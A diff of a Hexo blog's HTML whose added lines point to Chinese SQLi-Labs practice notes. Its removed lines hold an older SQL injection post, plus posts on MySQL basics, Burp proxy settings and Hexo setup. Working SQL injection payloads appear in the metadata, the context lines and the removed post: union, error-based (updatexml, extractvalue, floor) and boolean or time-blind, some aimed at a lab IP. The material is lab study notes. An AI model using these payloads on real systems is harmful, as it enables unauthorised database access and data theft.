@@ -3,17 +3,21 @@
 <head>
   <meta charset="utf-8">
   
-  <title>Yoghurt</title>
+  <title>SQLI-LABS闯关笔记 | Yoghurt</title>
 
   <!-- keywords -->
   
 
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="Yoghurt">
-<meta property="og:url" content="http://example.com/index.html">
+  <meta name="description" content="第一关1. please input the id as parameter with numeric value 请以数字值作为参数输入用户标示符 打开harkbar：http:&#x2F;&#x2F;45.32.113.109:55102&#x2F;Less-1&#x2F;?id&#x3D;1 结果：1Your Login name:Dumb ，Your Password:Dumb 当ID的值不同会返回不同的结果值 对应的实际语句是1SELE">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQLI-LABS闯关笔记">
+<meta property="og:url" content="http://example.com/2022/03/23/SQLi-Labs%E9%97%AF%E5%85%B3%E7%AC%94%E8%AE%B0/index.html">
 <meta property="og:site_name" content="Yoghurt">
+<meta property="og:description" content="第一关1. please input the id as parameter with numeric value 请以数字值作为参数输入用户标示符 打开harkbar：http:&#x2F;&#x2F;45.32.113.109:55102&#x2F;Less-1&#x2F;?id&#x3D;1 结果：1Your Login name:Dumb ，Your Password:Dumb 当ID的值不同会返回不同的结果值 对应的实际语句是1SELE">
 <meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2022-03-23T07:58:34.394Z">
+<meta property="article:modified_time" content="2022-03-31T08:15:32.862Z">
 <meta property="article:author" content="GXY BLOG">
 <meta name="twitter:card" content="summary">
   
@@ -146,9 +150,7 @@
 		</header>				
 	</div>
 </nav>
-      <div class="body-wrap">
-  
-    <article id="post-SQLi-Labs闯关笔记" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-SQLi-Labs闯关笔记" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
       <a href="/2022/03/23/SQLi-Labs%E9%97%AF%E5%85%B3%E7%AC%94%E8%AE%B0/" class="article-date">
@@ -164,15 +166,21 @@
       <header class="article-header">
         
   
-    <h1 itemprop="name">
-      <a class="article-title" href="/2022/03/23/SQLi-Labs%E9%97%AF%E5%85%B3%E7%AC%94%E8%AE%B0/">
-        SQLI-LABS闯关笔记
-        
-      </a>
+    <h1 class="article-title" itemprop="name">
+      SQLI-LABS闯关笔记
+      
     </h1>
   
 
       </header>
+      
+      <div class="article-info article-info-post">
+        
+        
+
+        
+        <div class="clearfix"></div>
+      </div>
       
     
     <div class="article-entry" itemprop="articleBody">
@@ -288,17 +296,19 @@ User-Agent:’ and updatexml(1,concat(0x7e,(select database())),1) and ‘1’ =
       
     </div>
     
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-      
-    
   </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2022/03/21/SQL%E6%B3%A8%E5%85%A5/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">sql注入</div>
+      <strong class="article-nav-caption">&gt;</strong>
+    </a>
+  
+</nav>
+
   
 </article>
 
@@ -307,399 +317,6 @@ User-Agent:’ and updatexml(1,concat(0x7e,(select database())),1) and ‘1’ =
 
 
 
-
-  
-    <article id="post-SQL注入" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2022/03/21/SQL%E6%B3%A8%E5%85%A5/" class="article-date">
-  	<time datetime="2022-03-21T02:19:18.382Z" itemprop="datePublished">2022-03-21</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2022/03/21/SQL%E6%B3%A8%E5%85%A5/">
-        sql注入
-        
-      </a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h4 id="clash-汉化"><a href="#clash-汉化" class="headerlink" title="clash 汉化"></a>clash 汉化</h4><h4 id="下载everything（window用于文件搜索）"><a href="#下载everything（window用于文件搜索）" class="headerlink" title="下载everything（window用于文件搜索）"></a>下载everything（window用于文件搜索）</h4><h4 id="下载Java"><a href="#下载Java" class="headerlink" title="下载Java"></a>下载Java</h4><ol>
-<li>以管理员身份运行安装，配置环境变量：</li>
-<li>新建系统变量：<br>更改系统变量path为：%JAVA_HOME%\bin;%SystemRoot%\system32;%SystemRoot%;%SystemRoot%\System32\Wbem;%SYSTEMROOT%\System32\WindowsPowerShell\v1.0<br>添加系统变量：<ul>
-<li> “JAVA_HOME_8”—-&gt; “C:\Program Files\Java\jdk1.8.0_171”</li>
-<li> “JAVA_HOME_11”—-&gt; “C:\Program Files\Java\jdk-11.0.13”</li>
-<li> “JAVA_HOME_15”—-&gt; “C:\Program Files\Java\jdk-15.0.2”<h4 id="switchOmega中新建情景模式"><a href="#switchOmega中新建情景模式" class="headerlink" title="switchOmega中新建情景模式"></a>switchOmega中新建情景模式</h4></li>
-</ul>
-</li>
-</ol>
-<table>
-<thead>
-<tr>
-<th>代理协议</th>
-<th>代理服务器</th>
-<th>代理端口</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>http</td>
-<td>127.0.0.1</td>
-<td>8080</td>
-</tr>
-</tbody></table>
-<hr>
-<h4 id="proxy-模块"><a href="#proxy-模块" class="headerlink" title="proxy 模块"></a>proxy 模块</h4><blockquote>
-<p>intercept模块：显示修改http请求及应答，并可以发送到其他模块</p>
-<blockquote>
-<p>Forward:发送数据<br>drop:丢弃请求包<br>intercept is off/on:拦截开关<br>action:右键功能</p>
-</blockquote>
-</blockquote>
-<blockquote>
-<p>http history模块：记录经过代理服务器的所有请求</p>
-</blockquote>
-<blockquote>
-<p>options模块：</p>
-<blockquote>
-<p>proxy listeners:默认情况下burp监听127.0.0.1：8080<br>导入安全证书<br>intercept Client Request :配置拦截规则<br>Intercept Server Responses:<br>    1.基于服务端配置拦截规则，设置拦截的匹配规则<br>    2.Intercept request based on the following rules 为选中状态时，burpsuite会匹配响应包<br>Intercept Server Responses:<br>    1.基于服务端配置拦截规则，设置拦截的匹配规则<br>    2.Intercept request based on the following rules 为选中状态时，burpsuite会匹配响应包</p>
-</blockquote>
-</blockquote>
-<hr>
-<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><h4 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h4><p>  union类型<br>  基于错误显示<br>  布尔类型<br>  基于时间<br>  其他类型</p>
-<h3 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h3><ul>
-<li>查询语句一 union 查询语句二</li>
-<li>（注：1.多条查询语句的查询列数是一致的 2.默认去重 3.页面必须要有显示位）</li>
-<li>#：如果用户可控的传值位置不在末尾，#之后的语句会被注释掉</li>
-<li>常用函数：</li>
-<li>concat(),concat_ws():连接多个字符串 ， group_concat():将多行结果连成一组</li>
-<li>information schema库：schemata,tables,columns</li>
-</ul>
-<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><h4 id="floor报错注入："><a href="#floor报错注入：" class="headerlink" title="floor报错注入："></a>floor报错注入：</h4><p>1.floor0西数的作用是返回小于等于该值的最大整数，只返回arg1整数部分 ，小数部分舍弃。</p>
-<p>2.标准Payload:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select 1 from (select count(*),concat(user),floor(rand(0)*2))x from information schema.tables group by x)y)</span><br></pre></td></tr></table></figure>
-
-<h4 id="xpath语法错误"><a href="#xpath语法错误" class="headerlink" title="xpath语法错误"></a>xpath语法错误</h4><ul>
-<li>extractvalue函数<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=&#x27;and(select extractvalue(1,concat(0x7e,(select语句))))</span><br></pre></td></tr></table></figure></li>
-<li>updatexml函数<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=&#x27;and(select updatexml(1,concat(&#x27;~&#x27;,(select语句())),1))</span><br></pre></td></tr></table></figure>
-注：<br>① 0x7e=’<del>’<br>② concat(‘a’,‘b’)=“ab”<br>③ version()=@@version<br>④ ‘</del>‘可以换成’#’、’$’等不满足xpath格式的字符<br>⑤ extractvalue()能查询字符串的最大长度为32，如果我们想要的结果超过32，就要用substring()函数截取或limit分页，一次查看最多32位</li>
-</ul>
-<h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><ul>
-<li>ascii() 函数，返回字符ascii码值</li>
-<li>left() 函数，返回从左至右截取固定长度的字符串</li>
-<li>substr()/substring() 函数 ， 返回从pos位置开始到length长度的子字符串</li>
-</ul>
-<ol>
-<li>求当前数据库的长度<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and (length(database()))&gt;7   (有回显)</span><br></pre></td></tr></table></figure></li>
-<li>判断数据库名<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://45.32.113.109:40198/Less-1/?id=1&#x27; and ascii(substr(database(),4,4))=117--+(117对应ASCII表的u，即数据库名第四个字母是u)</span><br></pre></td></tr></table></figure>
-<a target="_blank" rel="noopener" href="https://www.habaijian.com/">ascii表</a></li>
-</ol>
-<p>布尔盲注：<br>获取列名：<a target="_blank" rel="noopener" href="http://45.32.113.109:40198/Less-8/?id=1&#39;">http://45.32.113.109:40198/Less-8/?id=1&#39;</a> and ascii(substr((select distinct column_name from information_schema.columns where table_name=’users’ and table_schema=database()limit 0,1),1,1))=105–+<br>时间盲注：<a target="_blank" rel="noopener" href="http://45.32.113.109:50145/Less-9/?id=1&#39;and">http://45.32.113.109:50145/Less-9/?id=1&#39;and</a> if(length(database())&gt;5,sleep(5),1)–+</p>
-<h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><h2 id="http头注入"><a href="#http头注入" class="headerlink" title="http头注入"></a>http头注入</h2><h2 id="二次编码注入"><a href="#二次编码注入" class="headerlink" title="二次编码注入"></a>二次编码注入</h2><h2 id="base64注入"><a href="#base64注入" class="headerlink" title="base64注入"></a>base64注入</h2><h2 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h2><h2 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h2>
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-      
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-  
-    <article id="post-mysql" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2022/03/16/mysql/" class="article-date">
-  	<time datetime="2022-03-16T10:26:45.579Z" itemprop="datePublished">2022-03-16</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2022/03/16/mysql/">
-        mysql
-        
-      </a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="在ubuntu安装MySQL："><a href="#在ubuntu安装MySQL：" class="headerlink" title="在ubuntu安装MySQL："></a>在ubuntu安装MySQL：</h2><p> 查看有没有安装：<br> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpkg -l |grep mysql</span><br></pre></td></tr></table></figure><br> 安装mysql：<br> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install mysql-server</span><br></pre></td></tr></table></figure><br> 检查是否安装成功：<br> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net -tap | grep mysql</span><br></pre></td></tr></table></figure><br> 登录mysql：<br> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root -p</span><br></pre></td></tr></table></figure></p>
-<hr>
-<h2 id="mysql-常用的命令："><a href="#mysql-常用的命令：" class="headerlink" title="mysql 常用的命令："></a>mysql 常用的命令：</h2><ul>
-<li>显示所有数据库：show database；</li>
-<li>选定默认的数据库:use databasename;(databasename用数据库名字代替)</li>
-<li>显示数据库中所有的表：show tables；</li>
-<li>放弃正在输入的命令：\c</li>
-<li>显示命令清单：\h</li>
-<li>退出mysq程序：\q</li>
-<li>查看服务器状态：\s</li>
-</ul>
-<hr>
-<h2 id="使用PHP连接MySQL："><a href="#使用PHP连接MySQL：" class="headerlink" title="使用PHP连接MySQL："></a>使用PHP连接MySQL：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqli_connect(host, username, password, dbname,port, socket);</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$dbhost = &#x27;localhost&#x27;;  // mysql服务器主机地址</span><br><span class="line">$dbuser = &#x27;root&#x27;;            // mysql用户名</span><br><span class="line">$dbpass = &#x27;123456&#x27;;          // mysql用户名密码</span><br><span class="line">$conn = mysqli_connect($dbhost, $dbuser, $dbpass);</span><br><span class="line">if(! $conn )</span><br><span class="line">&#123;</span><br><span class="line">    die(&#x27;Could not connect: &#x27; . mysqli_error());</span><br><span class="line">&#125;</span><br><span class="line">echo &#x27;数据库连接成功！&#x27;;</span><br><span class="line">mysqli_close($conn);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<hr>
-<table>
-<thead>
-<tr>
-<th>操作</th>
-<th>语句</th>
-<th>PHP语法</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>创建数据库</td>
-<td>create database &lt;数据库名&gt;</td>
-<td>mysqli_query(connection,query,resultmode);</td>
-</tr>
-<tr>
-<td>删除数据库</td>
-<td>drop database &lt;数据库名&gt;</td>
-<td>mysqli_query(connection,query,resultmode);</td>
-</tr>
-<tr>
-<td>选择数据库</td>
-<td>use &lt;数据库名&gt;</td>
-<td>mysqli_select_db(connection,dbname);</td>
-</tr>
-<tr>
-<td>创建数据表</td>
-<td>create table table_name (column_name coulumn_type),(column_name coulumn_type)</td>
-<td>mysqli_query(connection,query,resultmode);</td>
-</tr>
-<tr>
-<td>删除数据表</td>
-<td>drop table table_name;</td>
-<td>mysqli_query(connection,query,resultmode);</td>
-</tr>
-<tr>
-<td>插入数据</td>
-<td>insert into table_name (field1,field2,…)   values(value1,value2,…);</td>
-<td>mysqli_query(connection,query,resultmode);</td>
-</tr>
-</tbody></table>
-<hr>
-<h2 id="mysql-语法："><a href="#mysql-语法：" class="headerlink" title="mysql 语法："></a>mysql 语法：</h2><ul>
-<li><h3 id="where"><a href="#where" class="headerlink" title="where"></a>where</h3>(BINARY 关键字来设定 WHERE 子句的字符串比较是区分大小写的)<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">  select * from runoob_tbl where BINARY runoob_author=&#x27;runoob.com&#x27;;```</span><br><span class="line">* ### update</span><br></pre></td></tr></table></figure>
-update runoob_tbl SET runoob_title=’学习 C++’ where runoob_id=3;<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">* ### delete</span><br></pre></td></tr></table></figure>
-delete from table_name where name=”1”;<br>```</li>
-<li><h3 id="link子句"><a href="#link子句" class="headerlink" title="link子句"></a>link子句</h3>模糊匹配，与%和_ 结合使用,如：</li>
-</ul>
-<p>‘%a’    ： //以a结尾的数据<br>‘a%’     ：//以a开头的数据<br>‘%a%’    ：//含有a的数据<br>‘_a_‘  ：三位且中间字母是a<br>‘_a’     //两位且结尾字母是a的<br>[]：表示括号内所列字符中的一个<br>[^] ：表示不在括号所列之内的单个字符。</p>
-<ul>
-<li><h3 id="union"><a href="#union" class="headerlink" title="union"></a>union</h3>将查询结果做并集，并且没有重复值</li>
-</ul>
-<p>==distinct==参数：删除结果集中重复的数据<br>==all==参数：返回所有的结果集包含重复的数据</p>
-<ul>
-<li><h3 id="Order-by"><a href="#Order-by" class="headerlink" title="Order by"></a>Order by</h3><p>排序：asc（升序）desc（降序）<br>通过 PHP 函数 ==mysqli_fetch_array()== 来输出所有查询的数据。<br><a target="_blank" rel="noopener" href="https://www.runoob.com/mysql/mysql-like-clause.html">详见</a></p>
-</li>
-<li><h3 id="group-by"><a href="#group-by" class="headerlink" title="group by"></a>group by</h3></li>
-</ul>
-<blockquote>
-<p>在分组的列上我们可以使用 COUNT, SUM, AVG,等函数。<br>使用 ==WITH ROLLUP==，此函数是对聚合函数进行求和，注意 with rollup是对 group by 后的第一个字段，进行分组求和。ORDER BY不能在rollup中使用，两者为互斥关键字.<br>==coalesce(a,b,c)==: 设置一个可以取代 NUll 的名称(注：如果a=null,则选择b；如果b==null,则选择c；如果a!=null,则选择a；如果a b c 都为null ，则返回为null（没意义）。</p>
-</blockquote>
-<ul>
-<li><h3 id="连接"><a href="#连接" class="headerlink" title="连接"></a>连接</h3><ul>
-<li>join  ：获取两个表中字段匹配关系的记录。</li>
-<li>left join ：获取左表所有记录，即使右表没有对应匹配的记录。</li>
-<li>right join ：与 LEFT JOIN 相反，用于获取右表所有记录，即使左表没有对应匹配的记录</li>
-</ul>
-</li>
-<li><h3 id="事务"><a href="#事务" class="headerlink" title="事务"></a>事务</h3><ul>
-<li>BEGIN 开始一个事务</li>
-<li>ROLLBACK 事务回滚</li>
-<li>COMMIT 事务确认<br><a target="_blank" rel="noopener" href="https://www.runoob.com/mysql/mysql-transaction.html">详见</a></li>
-</ul>
-</li>
-<li><h3 id="ALTER"><a href="#ALTER" class="headerlink" title="ALTER"></a>ALTER</h3></li>
-</ul>
-<p>修改数据表名或者修改数据表字段</p>
-<ol>
-<li><p>删除:<br><code>alter table &lt;table_name&gt; drop &lt;字段名&gt;；</code></p>
-</li>
-<li><p>添加:<br><code>alter table &lt;table_name&gt; add &lt;字段名&gt; &lt;字段类型&gt;;</code></p>
-</li>
-<li><p>修改字段类型及名称:</p>
-<p> 在ALTER命令中使用 ==MODIFY== 或 ==CHANGE== 子句<br>如：把字段 c 的类型从 CHAR(1) 改为 CHAR(10):<br><code>ALTER TABLE testalter_tbl MODIFY c CHAR(10);</code><br>在 CHANGE 关键字之后，紧跟着的是你要修改的字段名，然后指定新字段名及类型<br><code>ALTER TABLE testalter_tbl CHANGE i j BIGINT; </code></p>
-</li>
-<li><p>修改表名<br><code>mysql&gt; ALTER TABLE testalter_tbl RENAME TO alter_tbl;</code></p>
-</li>
-</ol>
-<p><a target="_blank" rel="noopener" href="https://www.runoob.com/mysql/mysql-alter.html">详见</a></p>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-      
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-  
-    <article id="post-如何创建博客" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2022/03/13/%E5%A6%82%E4%BD%95%E5%88%9B%E5%BB%BA%E5%8D%9A%E5%AE%A2/" class="article-date">
-  	<time datetime="2022-03-13T06:26:27.602Z" itemprop="datePublished">2022-03-13</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2022/03/13/%E5%A6%82%E4%BD%95%E5%88%9B%E5%BB%BA%E5%8D%9A%E5%AE%A2/">
-        如何搭建自己的博客
-        
-      </a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>有了自己的博客系统之后，就有了一个自己固定的展示平台</p>
-<h2 id="用hexo和github搭建博客需要的工具"><a href="#用hexo和github搭建博客需要的工具" class="headerlink" title="用hexo和github搭建博客需要的工具"></a>用hexo和github搭建博客需要的工具</h2><h3 id="下载node"><a href="#下载node" class="headerlink" title="下载node"></a>下载node</h3><ul>
-<li><p>它让JavaScript成为与PHP、Python等服务的端平起平坐得的脚本语言</p>
-<p>   <a target="_blank" rel="noopener" href="https://www.cnblogs.com/liuqiyun/p/8133904.html">安装教程</a></p>
-</li>
-</ul>
-<h2 id="下载git"><a href="#下载git" class="headerlink" title="下载git"></a>下载git</h2><ul>
-<li><p>他是一个开源的分布式版本控制系统</p>
-<p>   <a target="_blank" rel="noopener" href="https://www.cnblogs.com、xueweisuoyong/p/11914045.html">安装教程</a></p>
-</li>
-</ul>
-<h2 id="下载hexo"><a href="#下载hexo" class="headerlink" title="下载hexo"></a>下载hexo</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-cli -g</span><br></pre></td></tr></table></figure>
-
-<p>检查是否安装完成：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo -v</span><br></pre></td></tr></table></figure>
-
-
-<h2 id="创建仓库"><a href="#创建仓库" class="headerlink" title="创建仓库"></a>创建仓库</h2><ul>
-<li><p>注册一个github账号</p>
-</li>
-<li><p>用github创建一个仓库（注意：仓库名应该为：用户名.github.io)</p>
-<p>  <a target="_blank" rel="noopener" href="https://www.bilibili.com/red/cv5107169">教程</a></p>
-</li>
-</ul>
-<h2 id="生成SSH-keys"><a href="#生成SSH-keys" class="headerlink" title="生成SSH keys"></a>生成SSH keys</h2><ul>
-<li><p>在文件中打开gitbush</p>
-<p>  <code>ssh</code></p>
-<p>  <code>SSH-keygen -t rsa -C &quot;邮件地址&quot;</code></p>
-</li>
-<li><p>在磁盘中找到.ssh/.pub,打开复制内容</p>
-</li>
-<li><p>打开github -&gt; setting -&gt; ssh -&gt; add一个钥匙 将复制内容粘贴</p>
-</li>
-<li><p>测试ssh是否绑定成功</p>
-<p>  <code>SSH -T git@github.com</code></p>
-<pre><code>看见hello 用户名即为成功
-</code></pre>
-</li>
-</ul>
-<h2 id="在本地生成"><a href="#在本地生成" class="headerlink" title="在本地生成"></a>在本地生成</h2><ul>
-<li><p>在磁盘新建文件夹blog</p>
-</li>
-<li><p>在文件夹打开gitbush</p>
-<p>  初始化：<br>  <code>        hexo init</code></p>
-<p>  生成本地页面：<br>  <code>hexo s</code></p>
-</li>
-</ul>
-<h2 id="发布到网上"><a href="#发布到网上" class="headerlink" title="发布到网上"></a>发布到网上</h2><ul>
-<li>修改blog里config.yml的内容</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">deploy:</span><br><span class="line">		type:git</span><br><span class="line">		repository:(github的地址）</span><br><span class="line">		branch：main</span><br><span class="line">		token：</span><br></pre></td></tr></table></figure>
-<ul>
-<li>token 获取方法：在github中-&gt;setting -&gt; developer settings -&gt;personal access tokens -&gt; Generate new token</li>
-<li>可以直接将文件夹拖入仓库</li>
-<li>然后就可以在网络上访问你的博客了！</li>
-</ul>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-      
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-  
-  
 </div>
       <footer id="footer">
   <div class="outer">
@@ -725,8 +342,8 @@ delete from table_name where name=”1”;<br>```</li>
 		fancybox: true,
 		mathjax: false,
 		animate: true,
-		isHome: true,
-		isPost: false,
+		isHome: false,
+		isPost: true,
 		isArchive: false,
 		isTag: false,
 		isCategory: false,
